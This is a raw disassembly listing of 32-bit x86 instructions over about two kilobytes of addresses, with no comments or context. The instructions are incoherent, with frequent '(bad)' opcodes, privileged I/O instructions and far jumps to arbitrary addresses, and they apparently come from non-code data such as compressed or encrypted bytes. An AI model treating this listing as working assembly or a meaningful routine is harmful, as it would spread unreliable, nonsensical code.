  42f6ae:	int    0x4d
  42f6b0:	aad    0x74
  42f6b2:	repnz fdivrp st(0),st
  42f6b5:	and    al,0xc5
  42f6b7:	popa   
  42f6b8:	loopne 0x42f63d
  42f6ba:	pop    ecx
  42f6bb:	pop    esi
  42f6bc:	fld    DWORD PTR [eax]
  42f6be:	jb     0x42f727
  42f6c0:	add    DWORD PTR [ecx],eax
  42f6c2:	icebp  
  42f6c3:	popa   
  42f6c4:	(bad)  [ebx+0x501d6da5]
  42f6ca:	bound  edx,QWORD PTR [edi+0xf00506f]
  42f6d0:	data16 icebp 
  42f6d2:	test   DWORD PTR [edx*4+0x68bd8d41],esi
  42f6d9:	dec    esi
  42f6da:	(bad)  
  42f6db:	(bad)  
  42f6dc:	aam    0x44
  42f6de:	push   ecx
  42f6df:	push   esi
  42f6e0:	daa    
  42f6e1:	sub    DWORD PTR [ebx+0x4a4b0593],ecx
  42f6e7:	add    BYTE PTR [ebx-0x5b38ce28],bh
  42f6ed:	repz add DWORD PTR [eax],0x4682d8cb
  42f6f4:	pushf  
  42f6f5:	aam    0x75
  42f6f7:	je     0x42f6b8
  42f6f9:	int3   
  42f6fa:	adc    DWORD PTR [ebp+0x36],esi
  42f6fd:	int3   
  42f6fe:	adc    DWORD PTR [esp-0xc],esi
  42f702:	div    BYTE PTR [esi+ebp*1+0x66]
  42f706:	cli    
  42f707:	addr16 jnp 0x42f6ea
  42f70a:	add    BYTE PTR [eax],al
  42f70c:	es pushf 
  42f70e:	sbb    eax,0xc2665a44
  42f713:	call   FWORD PTR [ebx-0x27]
  42f716:	cmp    eax,0x85099a06
  42f71c:	mov    ah,0x8f
  42f71e:	mov    dl,0xff
  42f720:	pop    esi
  42f721:	sbb    al,0x15
  42f723:	inc    eax
  42f724:	dec    ebx
  42f725:	retf   
  42f726:	sub    DWORD PTR [edi],esp
  42f728:	cmp    ebx,eax
  42f72a:	jae    0x42f750
  42f72c:	aam    0x63
  42f72e:	sbb    eax,0xd8334c
  42f733:	lea    edi,[edi-0x47]
  42f736:	sbb    bh,bh
  42f738:	outs   dx,DWORD PTR ds:[esi]
  42f739:	aam    0x4c
  42f73b:	or     BYTE PTR [ebx],bh
  42f73d:	fadd   DWORD PTR [ecx+0x2085dbcb]
  42f743:	call   0x43cd9c
  42f748:	bound  eax,QWORD PTR ds:0xde000a3e
  42f74e:	push   ebp
  42f74f:	pop    eax
  42f750:	cli    
  42f751:	std    
  42f752:	outs   dx,BYTE PTR ds:[esi]
  42f753:	cmp    eax,0xb254953f
  42f758:	push   esi
  42f759:	jecxz  0x42f720
  42f75b:	or     eax,0x43826208
  42f760:	or     esp,DWORD PTR [edx-0x19]
  42f763:	inc    edi
  42f764:	out    0x98,eax
  42f766:	jecxz  0x42f7c0
  42f768:	cli    
  42f769:	or     BYTE PTR [edx-0x709d0003],bh
  42f76f:	inc    esi
  42f770:	popa   
  42f771:	jnp    0x42f7c7
  42f773:	sbb    DWORD PTR [esi+0x60],esp
  42f776:	cmp    cl,BYTE PTR [eax]
  42f778:	inc    esp
  42f779:	mov    ds:0x606536d6,eax
  42f77e:	dec    edx
  42f77f:	ins    BYTE PTR es:[edi],dx
  42f780:	shl    DWORD PTR [edi+eiz*8],cl
  42f783:	push   ebx
  42f784:	xchg   BYTE PTR [edx+esi*4],ah
  42f787:	ins    BYTE PTR es:[edi],dx
  42f788:	sar    BYTE PTR [eax],0x82
  42f78b:	std    
  42f78c:	icebp  
  42f78d:	push   ds
  42f78e:	fimul  WORD PTR [ecx+eax*1]
  42f791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f792:	add    DWORD PTR ds:0xc98222a4,0x2
  42f799:	fnstcw WORD PTR [ebx]
  42f79b:	ins    BYTE PTR es:[edi],dx
  42f79c:	lods   al,BYTE PTR ds:[esi]
  42f79d:	cmp    BYTE PTR [edx+0x1b2486fd],al
  42f7a3:	aas    
  42f7a4:	add    esp,DWORD PTR [edx-0x53]
  42f7a7:	test   ebx,ebp
  42f7a9:	loope  0x42f80f
  42f7ab:	pop    esp
  42f7ac:	xor    BYTE PTR [esi],0x45
  42f7af:	(bad)  
  42f7b0:	inc    DWORD PTR [eax]
  42f7b2:	(bad)  
  42f7b3:	iret   
  42f7b4:	stos   BYTE PTR es:[edi],al
  42f7b5:	push   edx
  42f7b6:	jno    0x42f7a2
  42f7b8:	test   eax,edi
  42f7ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f7bb:	rol    BYTE PTR [edi+0x652c7e4b],cl
  42f7c1:	cmp    BYTE PTR [edx+ebx*8],cl
  42f7c4:	bound  edx,QWORD PTR [edi+0x7d]
  42f7c7:	fld1   
  42f7c9:	add    esp,DWORD PTR [edx+0x64]
  42f7cc:	arpl   WORD PTR [eax],sp
  42f7ce:	fcompp 
  42f7d0:	out    0x3,eax
  42f7d2:	and    DWORD PTR [esi],ebx
  42f7d4:	or     al,0x10
  42f7d6:	outs   dx,BYTE PTR ds:[esi]
  42f7d7:	cmp    eax,0xfa03a7
  42f7dc:	add    BYTE PTR [edx+eiz*2],0x5e
  42f7e0:	call   0x728a:0xf01aeef3
  42f7e7:	or     DWORD PTR [ebp-0x40],ebp
  42f7ea:	adc    ecx,0xdd208ab7
  42f7f0:	aad    0x3a
  42f7f2:	jge    0x42f7fd
  42f7f4:	add    esi,DWORD PTR [edx+0x7275d61]
  42f7fa:	out    0x39,al
  42f7fc:	call   0x9ba15a04
  42f801:	pop    ds
  42f802:	jbe    0x42f868
  42f804:	sub    esp,DWORD PTR [eax]
  42f806:	jp     0x42f811
  42f808:	dec    esi
  42f809:	add    al,0x30
  42f80b:	adc    ecx,0x5e7288df
  42f811:	iret   
  42f812:	inc    ecx
  42f813:	int    0x70
  42f815:	mov    edi,0x6eb94100
  42f81a:	in     eax,dx
  42f81b:	in     al,0x7
  42f81d:	aam    0x8c
  42f81f:	adc    ch,ah
  42f821:	pop    esi
  42f822:	add    eax,0x3cdc14a
  42f827:	bound  ebx,QWORD PTR [esi-0x57]
  42f82a:	imul   eax,DWORD PTR [edx-0x22fc1841],0xffffffec
  42f831:	ret    
  42f832:	and    esp,edi
  42f834:	push   0xfffffff2
  42f836:	jg     0x42f7f6
  42f838:	fsub   st,st(7)
  42f83a:	add    ebx,edi
  42f83c:	or     al,0x1
  42f83e:	int    0x45
  42f840:	xor    ah,dl
  42f842:	jmp    0xc67bd1a8
  42f847:	imul   ebp,esp,0xb979a7ff
  42f84d:	int3   
  42f84e:	push   esp
  42f84f:	lods   al,BYTE PTR ds:[esi]
  42f850:	gs xchg esp,eax
  42f852:	add    eax,0xe9f97276
  42f857:	(bad)  
  42f858:	mov    ds:0x8161e900,al
  42f85d:	adc    BYTE PTR ds:0x5d8b6f8a,ah
  42f863:	jge    0x42f8d0
  42f865:	add    cl,ch
  42f867:	popa   
  42f868:	and    DWORD PTR [eax],0xf9d961cd
  42f86e:	cdq    
  42f86f:	lods   eax,DWORD PTR ds:[esi]
  42f870:	fs inc esp
  42f872:	lds    ecx,FWORD PTR [ecx+0x35745107]
  42f878:	mov    dh,0x9c
  42f87a:	jmp    0x511c597f
  42f87f:	fs in  eax,0xb5
  42f882:	sub    al,0x99
  42f884:	jmp    0xf579:0xce0d2515
  42f88b:	push   DWORD PTR [esi]
  42f88d:	outs   dx,DWORD PTR ds:[esi]
  42f88e:	jge    0x42f83d
  42f890:	xchg   BYTE PTR [eax+eax*8-0x22],bl
  42f894:	or     al,0x34
  42f896:	mov    bh,0xd7
  42f898:	popa   
  42f899:	fld    DWORD PTR [eax]
  42f89b:	ins    BYTE PTR es:[edi],dx
  42f89c:	loop   0x42f853
  42f89e:	imul   cl
  42f8a0:	popa   
  42f8a1:	fld    st(2)
  42f8a3:	jmp    0x1c8b1209
  42f8a8:	mov    ecx,0x2514ce5c
  42f8ad:	je     0x42f922
  42f8af:	stc    
  42f8b0:	ficomp DWORD PTR [eiz*1+0xce596c9]
  42f8b7:	add    BYTE PTR [eax],dl
  42f8b9:	xor    DWORD PTR ds:0x198b018,ebx
  42f8bf:	push   eax
  42f8c0:	lods   al,BYTE PTR ds:[esi]
  42f8c1:	mov    DWORD PTR ds:0x312be31c,ebx
  42f8c7:	add    BYTE PTR [ebx],cl
  42f8c9:	icebp  
  42f8ca:	mov    ecx,0x75065b74
  42f8cf:	adc    BYTE PTR [eax+0x16ff0198],al
  42f8d5:	(bad)  [esi-0x1]
  42f8d8:	mov    bh,0xd0
  42f8da:	and    al,0xe8
  42f8dc:	pusha  
  42f8dd:	int    0x0
  42f8df:	add    BYTE PTR [eax],al
  42f8e1:	cld    
  42f8e2:	pop    esi
  42f8e3:	shr    BYTE PTR [edx-0x36],cl
  42f8e6:	lock mov ecx,0xd72fcc5e
  42f8ec:	jmp    0x42f8a6
  42f8ee:	leave  
  42f8ef:	out    dx,al
  42f8f0:	inc    esi
  42f8f1:	inc    eax
  42f8f2:	mov    eax,ds:0x3363101d
  42f8f7:	sub    BYTE PTR [eax],al
  42f8f9:	retf   
  42f8fa:	add    ebx,edi
  42f8fc:	xor    dh,BYTE PTR [ebp-0x68b37dd2]
  42f902:	je     0x42f8e5
  42f904:	dec    esp
  42f905:	mov    ds:0xa08400dc,al
  42f90a:	aad    0x84
  42f90c:	xchg   esp,eax
  42f90d:	jnp    0x42f8eb
  42f90f:	add    bh,bh
  42f911:	es mov WORD PTR gs:[edi+eiz*2-0x37],cs
  42f917:	cmc    
  42f918:	jne    0x42f989
  42f91a:	add    eax,0x81930875
  42f91f:	cld    
  42f920:	jmp    FWORD PTR [edi+ebp*8+0x628d75b9]
  42f927:	xchg   ebp,eax
  42f928:	and    al,0xcb
  42f92a:	fadd   QWORD PTR [eax]
  42f92c:	add    al,dl
  42f92e:	add    BYTE PTR [esi],bl
  42f930:	test   BYTE PTR [edx-0x7e],ah
  42f933:	std    
  42f934:	call   DWORD PTR [edx+esi*4-0x2143979]
  42f93b:	sbb    DWORD PTR [eax-0x77027d9e],ecx
  42f941:	ficomp WORD PTR [ebp+0x1d00ff81]
  42f947:	add    BYTE PTR [esi-0x20dc17d],0xff
  42f94e:	bound  ecx,QWORD PTR [edx]
  42f950:	bound  esp,QWORD PTR [ebp+eax*1+0x7]
  42f954:	mov    edi,ebp
  42f956:	out    0x7,eax
  42f958:	retf   0xe944
  42f95b:	(bad)
  42f95f:	fcmovnb st,st(6)
  42f961:	sbb    ebp,DWORD PTR [edi+0x44]
  42f964:	mov    BYTE PTR [edx+0x72],cl
  42f967:	dec    eax
  42f968:	mov    BYTE PTR [eax],al
  42f96a:	aad    0x31
  42f96c:	add    eax,0x35ec5c87
  42f971:	out    0xc2,eax
  42f973:	cdq    
  42f974:	std    
  42f975:	(bad)  
  42f976:	jmp    0x8b1b5f4a
  42f97b:	cmp    ch,0x83
  42f97e:	mov    ebp,esp
  42f980:	sbb    bh,bl
  42f982:	sbb    eax,0x6a7a7d7e
  42f987:	or     dl,0x1b
  42f98a:	out    0xa5,eax
  42f98c:	sub    BYTE PTR [eax+0x7a],al
  42f98f:	call   0x7944:0xfc85ffa9
  42f996:	ins    DWORD PTR es:[edi],dx
  42f997:	rcl    DWORD PTR [esi+0x41],cl
  42f99a:	mov    edi,DWORD PTR [esi-0x159205b2]
  42f9a0:	cmp    edi,esp
  42f9a2:	mov    dl,0xd9
  42f9a4:	add    al,0x0
  42f9a6:	loope  0x42f967
  42f9a8:	or     BYTE PTR [eax],al
  42f9aa:	add    cl,ch
  42f9ac:	fnstenv [ebx+0x28]
  42f9af:	loop   0x42f98a
  42f9b1:	out    0x3,eax
  42f9b3:	pop    ecx
  42f9b4:	inc    esi
  42f9b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f9b6:	pop    esp
  42f9b7:	faddp  st(1),st
  42f9b9:	out    0x3,eax
  42f9bb:	cdq    
  42f9bc:	movd   mm0,DWORD PTR [edi-0x6c]
  42f9c0:	bound  eax,QWORD PTR [ecx+esi*4-0x46182219]
  42f9c7:	sbb    dh,ah
  42f9c9:	ret    
  42f9ca:	(bad)  
  42f9cb:	fsubr  QWORD PTR [eax+0x6e]
  42f9ce:	rol    BYTE PTR [ecx-0x23],0x66
  42f9d2:	jmp    0xe1a3:0x49b9d961
  42f9d9:	call   0x4350d139
  42f9de:	push   ebx
  42f9df:	loope  0x42f97a
  42f9e1:	mov    bl,0xfc
  42f9e3:	xor    al,0x99
  42f9e5:	out    dx,al
  42f9e6:	leave  
  42f9e7:	popa   
  42f9e8:	shl    BYTE PTR [edi],cl
  42f9ea:	pop    ebx
  42f9eb:	lods   eax,DWORD PTR ds:[esi]
  42f9ec:	mov    tr7,esp
  42f9ef:	int    0x5b
  42f9f1:	or     eax,DWORD PTR [eax]
  42f9f3:	adc    eax,0xeebaba04
  42f9f8:	adc    eax,0x325f3c4
  42f9fd:	lock jl 0x42fa11
  42fa00:	mov    ch,0xc7
  42fa02:	jle    0x42f9ae
  42fa04:	sub    esp,0x646e991d
  42fa0a:	inc    esp
  42fa0b:	push   cs
  42fa0c:	out    0x6e,al
  42fa0e:	xlat   BYTE PTR ds:[ebx]
  42fa0f:	add    BYTE PTR [ecx-0x37],al
  42fa12:	fs pop ecx
  42fa14:	or     ah,dl
  42fa16:	cmp    eax,0x3d82154d
  42fa1b:	and    DWORD PTR [ecx],0x7b3d7b5
  42fa21:	(bad)  
  42fa22:	outs   dx,BYTE PTR ds:[esi]
  42fa23:	inc    edx
  42fa24:	jge    0x42fa9d
  42fa26:	add    BYTE PTR [eax],al
  42fa28:	mov    cl,0x73
  42fa2a:	sub    DWORD PTR [ecx+0x2d8c063a],0x7a
  42fa31:	lds    edx,FWORD PTR [eax+0x13]
  42fa34:	inc    edi
  42fa35:	push   edi
  42fa36:	leave  
  42fa37:	xor    DWORD PTR [ebp-0x3f],0x2dea8ef9
  42fa3e:	jae    0x42fa6f
  42fa40:	push   ebp
  42fa41:	xchg   BYTE PTR [ebx+0x25504ce5],cl
  42fa47:	stos   DWORD PTR es:[edi],eax
  42fa48:	pushf  
  42fa49:	jbe    0x42fa1a
  42fa4b:	ins    BYTE PTR es:[edi],dx
  42fa4c:	xchg   esp,eax
  42fa4d:	ins    DWORD PTR es:[edi],dx
  42fa4e:	or     DWORD PTR [esi-0x15ef45e3],edx
  42fa54:	adc    eax,0x206414ba
  42fa59:	ins    BYTE PTR es:[edi],dx
  42fa5a:	push   eax
  42fa5b:	dec    esi
  42fa5c:	or     eax,0xea461cba
  42fa61:	add    DWORD PTR [ebx],edx
  42fa63:	test   eax,0x6c581061
  42fa68:	and    edx,ebp
  42fa6a:	or     DWORD PTR [edi-0x17a4a396],ebp
  42fa70:	sub    al,0x6c
  42fa72:	xchg   BYTE PTR [eax+eax*1],dl
  42fa75:	push   esp
  42fa76:	jle    0x42faf1
  42fa78:	and    ebx,DWORD PTR [ecx*2-0x1d97a8f7]
  42fa7f:	mov    dl,0xb6
  42fa81:	cbw    
  42fa83:	loopne 0x42fa76
  42fa85:	pop    esp
  42fa86:	cwde   
  42fa87:	pop    ecx
  42fa88:	xchg   edi,eax
  42fa89:	rol    BYTE PTR [esi],cl
  42fa8b:	jle    0x42fab2
  42fa8d:	xchg   ebp,eax
  42fa8e:	cs push ebx
  42fa90:	jb     0x42fa94
  42fa92:	pop    ecx
  42fa93:	in     al,dx
  42fa94:	stc    
  42fa95:	pop    edi
  42fa96:	fld    DWORD PTR [eax]
  42fa98:	fs in  eax,0x69
  42fa9b:	sti    
  42fa9c:	into   
  42fa9d:	adc    ecx,DWORD PTR [eax]
  42fa9f:	push   ecx
  42faa0:	add    BYTE PTR [edx+0x2a],cl
  42faa3:	popa   
  42faa4:	cmp    BYTE PTR [ebx-0x27],0x4
  42faa8:	push   0x4b
  42faaa:	out    dx,al
  42faab:	jmp    0x42fb17
  42faad:	aas    
  42faae:	out    dx,al
  42faaf:	rcr    BYTE PTR [ecx-0xd],1
  42fab2:	aas    
  42fab3:	cmp    edi,edi
  42fab5:	in     al,0x54
  42fab7:	mov    ecx,0xf98f1f74
  42fabc:	mov    WORD PTR [esi-0x1b0002ef],?
  42fac2:	and    eax,0x63cb15f6
  42fac7:	cmp    DWORD PTR [eax],eax
  42fac9:	mov    ss,WORD PTR ds:0x286d216e
  42facf:	push   eax
  42fad0:	push   0xd57b
  42fad5:	xor    ebx,DWORD PTR [ebp-0x63]
  42fad8:	inc    eax
  42fad9:	add    BYTE PTR [ebx],cl
  42fadb:	in     al,dx
  42fadc:	xchg   esp,eax
  42fadd:	hlt    
  42fade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fadf:	or     dh,bh
  42fae1:	xor    esi,DWORD PTR [edx]
  42fae3:	or     eax,0xa244275
  42fae8:	test   eax,eax
  42faea:	(bad)
  42faee:	leave  
  42faef:	mov    al,0x5e
  42faf2:	xchg   edx,eax
  42faf3:	adc    edi,esi
  42faf5:	dec    DWORD PTR [esi]
  42faf7:	out    dx,al
  42faf8:	in     eax,0x51
  42fafa:	inc    esi
  42fafb:	xchg   esp,eax
  42fafc:	cmc    
  42fafd:	push   eax
  42fafe:	stc    
  42faff:	or     ecx,edx
  42fb01:	test   DWORD PTR [ebx-0x6f],edi
  42fb04:	pop    ebx
  42fb05:	mov    esi,esi
  42fb07:	sbb    al,0x50
  42fb09:	call   0x395f2a
  42fb0e:	add    BYTE PTR ds:0x302ff685,al
  42fb14:	div    BYTE PTR [ebp-0x6d]
  42fb17:	or     DWORD PTR [eax],esi
  42fb19:	jmp    DWORD PTR [edx+0x6d]
  42fb1c:	aad    0xf
  42fb1e:	and    al,BYTE PTR [edx+0x6ef6bf82]
  42fb24:	mov    eax,0x7c7deffa
  42fb29:	jl     0x42fb89
  42fb2b:	cmc    
  42fb2c:	ret    0xca07
  42fb2f:	outs   dx,BYTE PTR ds:[esi]
  42fb30:	sahf   
  42fb31:	aas    
  42fb32:	bound  esi,QWORD PTR [edx-0x7e1e6aa4]
  42fb38:	std    
  42fb39:	jle    0x42fb61
  42fb3b:	jbe    0x42fabf
  42fb3d:	mov    edi,0x8464b400
  42fb42:	jmp    0x42fba2
  42fb44:	push   ebx
  42fb45:	rol    BYTE PTR [edi],cl
  42fb47:	xchg   ebx,eax
  42fb48:	out    0x40,eax
  42fb4a:	out    0x30,eax
  42fb4c:	xchg   edx,eax
  42fb4d:	push   eax
  42fb4e:	cli    
  42fb4f:	jmp    0x5b2af820
  42fb54:	fild   DWORD PTR [eax+eax*1]
  42fb57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb58:	out    0x3f,eax
  42fb5a:	out    0x62,eax
  42fb5c:	fild   DWORD PTR [eax+eax*1]
  42fb5f:	cmc    
  42fb60:	test   BYTE PTR [ecx-0x6],cl
  42fb63:	push   edi
  42fb64:	cli    
  42fb65:	repz aas 
  42fb67:	bound  ecx,QWORD PTR [esi+esi*1-0x43]
  42fb6b:	push   0xffffff82
  42fb6d:	test   bl,ch
  42fb6f:	push   esi
  42fb70:	dec    edi
  42fb71:	mov    dl,0x51
  42fb73:	xor    eax,0x16884be7
  42fb78:	xchg   esi,eax
  42fb79:	in     eax,0x8c
  42fb7b:	push   ss
  42fb7c:	sahf   
  42fb7d:	int    0xb8
  42fb7f:	mov    ebp,0xdbfffd81
  42fb84:	push   ebp
  42fb85:	and    DWORD PTR [eax],ebp
  42fb87:	mov    edx,0x9dfc3696
  42fb8c:	hlt    
  42fb8d:	shl    DWORD PTR [ebx],0x12
  42fb90:	push   edx
  42fb91:	push   eax
  42fb92:	adc    al,0xfe
  42fb94:	fdiv   st,st(5)
  42fb96:	ret    
  42fb97:	test   DWORD PTR [esi-0x41],ebx
  42fb9a:	jge    0x42fbb5
  42fb9c:	mov    ch,0x3
  42fb9e:	mov    DWORD PTR [ebx+ebx*8+0x63000863],ecx
  42fba5:	(bad)  
  42fba7:	adc    BYTE PTR [ecx],0xb5
  42fbaa:	pop    ds
  42fbab:	lea    eax,[ebp-0x26]
  42fbae:	out    0x3,eax
  42fbb0:	dec    edx
  42fbb1:	sahf   
  42fbb2:	lahf   
  42fbb3:	push   ecx
  42fbb4:	dec    eax
  42fbb5:	pop    edi
  42fbb6:	fcom   QWORD PTR [ebx]
  42fbb8:	push   esp
  42fbb9:	sbb    eax,ebp
  42fbbb:	and    BYTE PTR [ecx-0x5b4bd04b],0x6a
  42fbc2:	mov    cl,0x81
  42fbc4:	xchg   ecx,eax
  42fbc5:	mov    ch,0xbb
  42fbc7:	mov    WORD PTR [edx],?
  42fbc9:	(bad)  
  42fbcb:	add    ebp,ebx
  42fbcd:	adc    eax,0x3dfdf7cc
  42fbd2:	lahf   
  42fbd3:	push   ecx
  42fbd4:	or     BYTE PTR [ebp-0x55],bl
  42fbd7:	daa    
  42fbd8:	dec    esi
  42fbd9:	or     DWORD PTR [edi+0x3f5f134e],esi
  42fbdf:	adc    DWORD PTR [ecx+0x78ca3b5],0xdb03e7da
  42fbe9:	std    
  42fbea:	add    edx,DWORD PTR [edx+ecx*8]
  42fbed:	dec    ecx
  42fbee:	pop    ds
  42fbef:	push   ecx
  42fbf0:	fcomp  DWORD PTR [ebx+eiz*4+0x27]
  42fbf4:	or     DWORD PTR es:[edi-0x64a94cb2],esi
  42fbfb:	daa    
  42fbfc:	push   esi
  42fbfd:	fstp   DWORD PTR [esi+0x54]
  42fc00:	jmp    0x5d55:0x5927c3e5
  42fc07:	add    al,0x0
  42fc09:	(bad)  
  42fc0a:	fldenv [ecx+eiz*2+0x68]
  42fc0e:	push   ebp
  42fc0f:	add    BYTE PTR [ebx+0x5e],bl
  42fc12:	fld    DWORD PTR [eax]
  42fc14:	fs xor al,0xdf
  42fc17:	test   BYTE PTR [ebx+0x61],dh
  42fc1a:	fld    DWORD PTR [eax]
  42fc1c:	mov    al,ds:0xe940360d
  42fc21:	sbb    DWORD PTR [ecx+0xb],esp
  42fc24:	into   
  42fc25:	sbb    al,0x6f
  42fc27:	adc    esi,DWORD PTR [ebp+0x7200aa6e]
  42fc2d:	mov    ecx,0x2db6fbeb
  42fc32:	loopne 0x42fc85
  42fc34:	scas   al,BYTE PTR es:[edi]
  42fc35:	xor    eax,0x8a721cb6
  42fc3a:	push   ebx
  42fc3b:	retf   0xe891
  42fc3e:	outs   dx,DWORD PTR ds:[esi]
  42fc3f:	stc    
  42fc40:	xchg   esi,eax
  42fc41:	loop   0x42fc58
  42fc43:	and    eax,0x445cf1ed
  42fc48:	int    0x7d
  42fc4a:	or     DWORD PTR [edi-0x18],esp
  42fc4d:	jo     0x42fcb6
  42fc4f:	push   edx
  42fc50:	pop    ds
  42fc51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fc52:	push   es
  42fc53:	and    eax,0x7429dac1
  42fc58:	mov    ah,0x88
  42fc5a:	push   ss
  42fc5b:	and    eax,0x7429eafd
  42fc60:	adc    al,0x79
  42fc62:	push   cs
  42fc63:	and    eax,0x85706905
  42fc68:	popf   
  42fc69:	cmp    eax,0xad85b9
  42fc6e:	aam    0xd1
  42fc70:	and    DWORD PTR [eax],0xffffffad
  42fc73:	aam    0x7d
  42fc75:	xor    BYTE PTR [ebp-0x1c],ah
  42fc78:	push   ss
  42fc79:	jb     0x42fc48
  42fc7b:	(bad)  
  42fc7c:	xor    eax,0xf9da9534
  42fc81:	popf   
  42fc82:	jge    0x42fc45
  42fc84:	test   DWORD PTR [edx],esp
  42fc86:	sbb    al,0xe6
  42fc88:	and    al,0x0
  42fc8a:	mov    edi,0x9cfe680d
  42fc8f:	sbb    eax,DWORD PTR [ebx+0x3f79a744]
  42fc95:	add    DWORD PTR [edx+ebp*2+0x32],0xfffffff0
  42fc9a:	sub    DWORD PTR [edx-0x4698a37e],ebp
  42fca0:	cmc    
  42fca1:	je     0x42fd0a
  42fca3:	mov    ch,0xf5
  42fca5:	push   esp
  42fca6:	ror    DWORD PTR [bx+di-0x1],1
  42fcaa:	xchg   BYTE PTR [ebp+0x364b400b],cl
  42fcb0:	push   edi
  42fcb1:	pop    ebp
  42fcb2:	jo     0x42fd0e
  42fcb4:	mov    ebp,0xac0df87c
  42fcb9:	fmul   DWORD PTR [ebx-0x64]
  42fcbc:	shl    BYTE PTR [ebp+0x343d085c],0xb8
  42fcc3:	pcmpgtd mm4,QWORD PTR [edx+0x7]
  42fcc7:	enter  0xb9c0,0xfc
  42fccb:	pop    esp
  42fccc:	sub    ah,bl
  42fcce:	or     esi,DWORD PTR [ecx+0x3400cbbf]
  42fcd4:	or     BYTE PTR [ebx+esi*1-0x66],0x80
  42fcd9:	leave  
  42fcda:	and    ecx,DWORD PTR [ecx+0x44b93840]
  42fce0:	pop    esp
  42fce1:	add    BYTE PTR [ebp+0x34384015],cl
  42fce7:	ficom  DWORD PTR [edi+0x34c7d4d0]
  42fced:	mov    edi,0x7ca42489
  42fcf2:	xor    al,0x89
  42fcf4:	lds    ebp,FWORD PTR [ebx+0x383e8410]
  42fcfa:	xor    al,0x63
  42fcfc:	test   eax,edx
  42fcfe:	lods   al,BYTE PTR ds:[esi]
  42fcff:	in     eax,dx
  42fd00:	xor    bh,BYTE PTR [edi-0x68dc9d50]
  42fd06:	mov    esp,0x38a1e38f
  42fd0b:	aas    
  42fd0c:	mov    ah,0x1c
  42fd0e:	jge    0x42fd82
  42fd10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fd11:	push   ecx
  42fd12:	mov    bl,0x12
  42fd14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fd15:	pop    ebp
  42fd16:	push   0xc19c00ae
  42fd1b:	cdq    
  42fd1c:	addr16 loop 0x42fd50
  42fd1f:	mov    dl,0xb3
  42fd21:	mov    eax,ds:0x3e622e38
  42fd26:	sbb    al,0x42
  42fd28:	jecxz  0x42fd4d
  42fd2a:	pop    ebp
  42fd2b:	push   edx
  42fd2c:	jmp    0x42fcd0
  42fd2e:	imul   ebp,DWORD PTR [ecx],0x0
  42fd31:	xor    esp,DWORD PTR [esi]
  42fd33:	into   
  42fd34:	add    edx,DWORD PTR [esi]
  42fd36:	xchg   ebp,eax
  42fd37:	add    BYTE PTR [edx+0x31],dh
  42fd3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd3b:	cmp    BYTE PTR [esi-0x79e3d232],cl
  42fd41:	push   0x70921c56
  42fd46:	ss jnp 0x42fdbf
  42fd49:	retf   
  42fd4a:	sub    DWORD PTR [ecx],ebx
  42fd4c:	outs   dx,BYTE PTR ds:[esi]
  42fd4d:	add    edx,DWORD PTR [esi]
  42fd4f:	jge    0x42fdc3
  42fd51:	(bad)  
  42fd52:	cmp    bh,BYTE PTR [eax+0x68a3034e]
  42fd58:	sbb    DWORD PTR [eax+0x7baa1c56],0xffffffac
  42fd5f:	push   cs
  42fd60:	ss jecxz 0x42fd78
  42fd63:	jge    0x42fdb7
  42fd65:	inc    edi
  42fd66:	push   edx
  42fd67:	mov    bl,0x6a
  42fd69:	dec    edi
  42fd6a:	ds shr dh,1
  42fd6d:	pop    ecx
  42fd6e:	mov    ds:0x7ec71b38,al
  42fd73:	pop    eax
  42fd74:	mov    dh,0x2f
  42fd76:	sub    eax,0x56989638
  42fd7b:	sbb    al,0x2e
  42fd7d:	fstp   DWORD PTR [esi+0x76ad6d13]
  42fd83:	sbb    eax,DWORD PTR [edi]
  42fd85:	leave  
  42fd86:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42fd88:	push   0xffffffad
  42fd8a:	adc    BYTE PTR [esi+0x423ae0f1],ah
  42fd90:	mov    dl,0x6
  42fd92:	mov    eax,0x7452a3a8
  42fd97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fd98:	dec    edx
  42fd99:	lods   eax,DWORD PTR ds:[esi]
  42fd9a:	shl    dh,cl
  42fd9c:	add    BYTE PTR [esi],dl
  42fd9e:	loop   0x42fdaf
  42fda0:	xor    eax,0x2276e916
  42fda5:	(bad)  
  42fda6:	mov    al,ds:0xc54e54f1
  42fdab:	out    dx,eax
  42fdac:	fst    DWORD PTR [edx-0x655e3d08]
  42fdb2:	sub    DWORD PTR [esi],edx
  42fdb4:	xor    eax,0x9d322e7d
  42fdb9:	adc    edx,ebp
  42fdbb:	jb     0x42fe36
  42fdbd:	mov    edx,0x4c1a2926
  42fdc2:	xchg   BYTE PTR [ebp+0x63],dl
  42fdc5:	and    edx,DWORD PTR [ebx-0x3650e354]
  42fdcb:	xchg   edx,eax
  42fdcc:	push   ecx
  42fdcd:	xchg   edx,eax
  42fdce:	xor    DWORD PTR [esi+0x61925a65],eax
  42fdd4:	dec    ebp
  42fdd5:	dec    eax
  42fdd6:	in     eax,dx
  42fdd7:	push   esi
  42fdd8:	and    cl,BYTE PTR [edi]
  42fdda:	mov    ds:0xfd6724c9,al
  42fddf:	js     0x42fd82
  42fde1:	cmp    bh,ch
  42fde3:	and    ebp,DWORD PTR [esi+0x61682d49]
  42fde9:	sub    bl,BYTE PTR [esi+0x75]
  42fdec:	sbb    al,0x6f
  42fdee:	leave  
  42fdef:	ss out 0x95,eax
  42fdf2:	lods   eax,DWORD PTR ds:[esi]
  42fdf3:	adc    eax,0x94295f
  42fdf8:	rol    bl,1
  42fdfa:	clc    
  42fdfb:	popw   ds
  42fdfd:	sbb    BYTE PTR [edi+ecx*8],dh
  42fe00:	aaa    
  42fe01:	add    BYTE PTR ds:0xdf0d860d,ah
  42fe07:	jb     0x42fe29
  42fe09:	in     eax,dx
  42fe0a:	popa   
  42fe0b:	(bad)  [ebp-0x49]
  42fe0e:	(bad)  [eax-0x1]
  42fe11:	call   0x91930977
  42fe16:	std    
  42fe17:	cmc    
  42fe18:	inc    esp
  42fe19:	jmp    0xd79fcb36
